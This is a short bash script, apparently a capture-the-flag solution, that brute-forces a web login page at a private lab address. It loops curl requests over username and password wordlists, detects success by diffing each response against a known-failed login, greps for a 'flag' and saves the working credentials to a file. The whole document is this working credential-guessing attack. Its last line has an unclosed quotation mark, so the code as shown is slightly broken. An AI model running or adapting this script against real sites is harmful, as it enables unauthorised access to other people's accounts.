#!/bin/bash

curl -s "http://192.168.1.175/?page=signin&username=qsdqsd&password=qsd&Login=Login#" > trueone
while IFS='' read -r user; do
		echo "try user : $user"
		url1="http://192.168.1.175/?page=signin&username="
		url2="&password="
		url3="&Login=Login#"
		while IFS='' read -r line; do
				echo "try password: $line"
				curl -s "$url1$user$url2$line$url3" > testee
				DIFF=$(diff trueone testee)
				if [ "$DIFF" != "" ]
				then
						cat testee | grep "flag"
						echo "user is : $user\npassword is $line" >> result.txt
						rm testee
						break
				fi
				rm testee
		done < "dict.txt"
done < "users.txt